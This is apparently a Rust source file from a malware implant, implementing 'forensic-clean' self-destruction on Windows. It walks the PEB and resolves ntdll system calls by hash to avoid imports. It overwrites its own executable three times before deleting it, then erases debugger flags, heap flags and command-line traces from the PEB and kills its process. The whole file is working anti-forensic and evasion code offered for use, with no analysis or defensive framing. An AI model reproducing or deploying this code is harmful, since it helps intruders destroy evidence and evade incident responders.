// selfdestruct.rs — Forensic-clean self-deletion, 2026 hardened
// Hash constants now from crate::hashes (live ntdll scan via build.rs).

#![allow(non_snake_case, dead_code)]

use crate::hashes::{H_NTCF, H_NTWF, H_NTSIF, H_NTCL, H_NTTP};
use core::ffi::c_void;
use core::ptr::null_mut;

pub type NtCreateFile = unsafe extern "system" fn(
    *mut *mut c_void, u32, *mut ObjectAttributes,
    *mut IoStatusBlock, *mut i64, u32, u32, u32, u32, *mut c_void, u32,
) -> i32;

pub type NtWriteFile = unsafe extern "system" fn(
    *mut c_void, *mut c_void, *mut c_void, *mut c_void,
    *mut IoStatusBlock, *const c_void, u32, *const i64, *mut u32,
) -> i32;

pub type NtSetInformationFile = unsafe extern "system" fn(
    *mut c_void, *mut IoStatusBlock, *const c_void, u32, u32,
) -> i32;

pub type NtClose = unsafe extern "system" fn(*mut c_void) -> i32;

pub type NtTerminateProcess = unsafe extern "system" fn(
    *mut c_void, i32,
) -> i32;

#[repr(C)]
pub struct UnicodeString { pub Length: u16, pub MaximumLength: u16, pub Buffer: *mut u16 }

#[repr(C)]
pub struct ObjectAttributes {
    pub Length: u32, pub RootDirectory: *mut c_void,
    pub ObjectName: *mut UnicodeString, pub Attributes: u32,
    pub SecurityDescriptor: *mut c_void, pub SecurityQualityOfService: *mut c_void,
}

#[repr(C)]
pub struct IoStatusBlock { pub Status: i32, pub Information: usize }

#[repr(C)]
struct FileDispositionInfo { DeleteFile: u8 }

#[inline(always)]
unsafe fn rdtsc() -> u64 {
    let lo: u32; let hi: u32;
    core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi, options(nomem, nostack));
    ((hi as u64) << 32) | lo as u64
}

struct Xorshift64(u64);
impl Xorshift64 {
    fn new() -> Self { Xorshift64(unsafe { rdtsc() } | 1) }
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13; self.0 ^= self.0 >> 7; self.0 ^= self.0 << 17; self.0
    }
    fn fill(&mut self, buf: &mut [u8]) {
        let mut i = 0;
        while i < buf.len() {
            let v = self.next().to_le_bytes();
            let take = (buf.len() - i).min(8);
            buf[i..i+take].copy_from_slice(&v[..take]);
            i += take;
        }
    }
}

pub unsafe fn ntdll_base() -> *const u8 {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    let head  = e;
    loop {
        let len = *(e.add(0x38) as *const u16) as usize;
        let buf = *(e.add(0x48) as *const *const u16);
        if len >= 10 {
            let sl = core::slice::from_raw_parts(buf, len / 2);
            if sl.len() >= 5
                && sl[0] | 0x20 == b'n' as u16 && sl[1] | 0x20 == b't' as u16
                && sl[2] | 0x20 == b'd' as u16 && sl[3] | 0x20 == b'l' as u16
                && sl[4] | 0x20 == b'l' as u16
            { return *(e.add(0x18) as *const *const u8); }
        }
        let next = *(e as *const *const u8);
        if next == head { break; }
        e = next;
    }
    null_mut()
}

#[inline]
unsafe fn resolve_fn(base: *const u8, hash: u32) -> Option<usize> {
    #[repr(C)] struct DosH  { m: u16, _p: [u8;58], lfanew: i32 }
    #[repr(C)] struct NtH   { _s:[u8;24], _oh_magic:u16, _r1:[u8;86], export_rva:u32, _rest:[u8;120] }
    #[repr(C)] struct ExpDir{ _c:[u8;16],_b:u32,nf:u32,nn:u32,frvas:u32,nrvas:u32,nords:u32 }
    let dos = &*(base as *const DosH);
    if dos.m != 0x5A4D { return None; }
    let nt  = &*((base as usize + dos.lfanew as usize) as *const NtH);
    let exp = &*((base as usize + nt.export_rva as usize) as *const ExpDir);
    let frvas = (base as usize + exp.frvas as usize) as *const u32;
    let nrvas = (base as usize + exp.nrvas as usize) as *const u32;
    let nords = (base as usize + exp.nords as usize) as *const u16;
    for i in 0..exp.nn as usize {
        let np = (base as usize + *nrvas.add(i) as usize) as *const u8;
        let mut h: u32 = 5381; let mut j = 0usize;
        loop { let c = *np.add(j); if c==0{break;} h=h.wrapping_mul(33).wrapping_add(c as u32); j+=1; }
        if h == hash {
            let ord = *nords.add(i) as usize;
            return Some(base as usize + *frvas.add(ord) as usize);
        }
    }
    None
}

unsafe fn own_image_path_raw() -> (*const u16, u16) {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let params = *(peb.add(0x20) as *const usize);
    if params == 0 { return (null_mut(), 0); }
    let len = *((params + 0x60) as *const u16);
    let buf = *((params + 0x68) as *const *const u16);
    (buf, len)
}

unsafe fn make_nt_path(wide: *const u16, len_bytes: u16) -> ([u16; 520], u16) {
    let prefix = [0x5Cu16, 0x3F, 0x3F, 0x5C];
    let mut buf = [0u16; 520];
    buf[0..4].copy_from_slice(&prefix);
    let src_words = len_bytes as usize / 2;
    let src = core::slice::from_raw_parts(wide, src_words);
    buf[4..4+src_words].copy_from_slice(src);
    (buf, ((4 + src_words) * 2) as u16)
}

unsafe fn wipe_file_three_pass(
    fn_write: NtWriteFile, fn_ntsi: NtSetInformationFile,
    h_file: *mut c_void, file_size: usize,
) {
    let mut rng  = Xorshift64::new();
    let     chunk = 65536usize;
    let mut buf  = vec![0u8; chunk];
    for pass in 0u8..3 {
        let mut written = 0usize;
        while written < file_size {
            let to_write = (file_size - written).min(chunk);
            let offset: i64 = written as i64;
            match pass {
                0 => buf[..to_write].iter_mut().for_each(|b| *b = 0x00),
                1 => buf[..to_write].iter_mut().for_each(|b| *b = 0xFF),
                _ => rng.fill(&mut buf[..to_write]),
            }
            let mut isb = IoStatusBlock { Status: 0, Information: 0 };
            fn_write(h_file, null_mut(), null_mut(), null_mut(), &mut isb,
                buf.as_ptr() as *const c_void, to_write as u32, &offset, null_mut());
            written += to_write;
        }
    }
    let di = FileDispositionInfo { DeleteFile: 1 };
    let mut isb = IoStatusBlock { Status: 0, Information: 0 };
    fn_ntsi(h_file, &mut isb, &di as *const _ as *const c_void,
        core::mem::size_of::<FileDispositionInfo>() as u32, 13);
}

unsafe fn scrub_peb() {
    let peb: *mut u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    if peb.is_null() { return; }
    *peb.add(0x02) = 0;
    *(peb.add(0xBC) as *mut u32) = 0;
    *(peb.add(0x10) as *mut usize) = 0;
    let heap_ptr = *(peb.add(0x30) as *const usize);
    if heap_ptr != 0 {
        *((heap_ptr + 0x40) as *mut u32) = 2;
        *((heap_ptr + 0x44) as *mut u32) = 0;
    }
    let params = *(peb.add(0x20) as *const usize);
    if params == 0 { return; }
    for off in [0x60usize, 0x70] {
        let us_len = *((params + off) as *const u16);
        let us_buf = *((params + off + 8) as *const *mut u16);
        if !us_buf.is_null() && us_len > 0 {
            let sl = core::slice::from_raw_parts_mut(us_buf, us_len as usize / 2);
            sl.iter_mut().for_each(|w| *w = 0);
        }
        *((params + off) as *mut u16) = 0;
    }
}

pub unsafe fn destruct() -> ! {
    let base = ntdll_base();
    let fn_ntcf  = resolve_fn(base, H_NTCF ).map(|a| core::mem::transmute::<usize, NtCreateFile>(a));
    let fn_ntwf  = resolve_fn(base, H_NTWF ).map(|a| core::mem::transmute::<usize, NtWriteFile>(a));
    let fn_ntsif = resolve_fn(base, H_NTSIF).map(|a| core::mem::transmute::<usize, NtSetInformationFile>(a));
    let fn_ntcl  = resolve_fn(base, H_NTCL ).map(|a| core::mem::transmute::<usize, NtClose>(a));
    let fn_nttp  = resolve_fn(base, H_NTTP ).map(|a| core::mem::transmute::<usize, NtTerminateProcess>(a));

    if let (Some(ntcf), Some(ntwf), Some(ntsif), Some(ntcl)) =
        (fn_ntcf, fn_ntwf, fn_ntsif, fn_ntcl)
    {
        let (raw_ptr, raw_len) = own_image_path_raw();
        if !raw_ptr.is_null() && raw_len > 0 {
            let (mut nt_path, nt_len) = make_nt_path(raw_ptr, raw_len);
            let mut us = UnicodeString {
                Length: nt_len, MaximumLength: nt_len + 2,
                Buffer: nt_path.as_mut_ptr(),
            };
            let mut oa = ObjectAttributes {
                Length: core::mem::size_of::<ObjectAttributes>() as u32,
                RootDirectory: null_mut(), ObjectName: &mut us,
                Attributes: 0x40, SecurityDescriptor: null_mut(),
                SecurityQualityOfService: null_mut(),
            };
            let mut h_file: *mut c_void = null_mut();
            let mut isb = IoStatusBlock { Status: 0, Information: 0 };
            let status = ntcf(
                &mut h_file, 0x40100080, &mut oa, &mut isb,
                null_mut(), 0x80, 0, 3, 0x20, null_mut(), 0,
            );
            if status >= 0 && !h_file.is_null() {
                let peb: usize;
                core::arch::asm!("mov {b}, gs:[0x60]", b = out(reg) peb);
                let img_base = *(peb as *const usize + 2);
                let nt_off   = *((img_base + 0x3C) as *const u32) as usize;
                let img_size = *((img_base + nt_off + 0x50) as *const u32) as usize;
                wipe_file_three_pass(ntwf, ntsif, h_file, img_size);
                ntcl(h_file);
            }
        }
    }
    scrub_peb();
    if let Some(nttp) = fn_nttp { nttp(-1isize as *mut c_void, 0); }
    core::hint::unreachable_unchecked()
}

pub unsafe fn wipe_self() {
    let base = ntdll_base();
    let fn_ntcf  = resolve_fn(base, H_NTCF ).map(|a| core::mem::transmute::<usize, NtCreateFile>(a));
    let fn_ntwf  = resolve_fn(base, H_NTWF ).map(|a| core::mem::transmute::<usize, NtWriteFile>(a));
    let fn_ntsif = resolve_fn(base, H_NTSIF).map(|a| core::mem::transmute::<usize, NtSetInformationFile>(a));
    let fn_ntcl  = resolve_fn(base, H_NTCL ).map(|a| core::mem::transmute::<usize, NtClose>(a));
    if let (Some(ntcf), Some(ntwf), Some(ntsif), Some(ntcl)) =
        (fn_ntcf, fn_ntwf, fn_ntsif, fn_ntcl)
    {
        let (raw_ptr, raw_len) = own_image_path_raw();
        if raw_ptr.is_null() || raw_len == 0 { return; }
        let (mut nt_path, nt_len) = make_nt_path(raw_ptr, raw_len);
        let mut us = UnicodeString { Length: nt_len, MaximumLength: nt_len+2, Buffer: nt_path.as_mut_ptr() };
        let mut oa = ObjectAttributes {
            Length: core::mem::size_of::<ObjectAttributes>() as u32,
            RootDirectory: null_mut(), ObjectName: &mut us, Attributes: 0x40,
            SecurityDescriptor: null_mut(), SecurityQualityOfService: null_mut(),
        };
        let mut h: *mut c_void = null_mut();
        let mut isb = IoStatusBlock { Status: 0, Information: 0 };
        let st = ntcf(&mut h, 0x40100080, &mut oa, &mut isb, null_mut(), 0x80, 0, 3, 0x20, null_mut(), 0);
        if st >= 0 && !h.is_null() {
            let peb: usize; core::arch::asm!("mov {b}, gs:[0x60]", b = out(reg) peb);
            let img_base = *(peb as *const usize + 2);
            let nt_off   = *((img_base + 0x3C) as *const u32) as usize;
            let img_size = *((img_base + nt_off + 0x50) as *const u32) as usize;
            wipe_file_three_pass(ntwf, ntsif, h, img_size);
            ntcl(h);
        }
    }
}
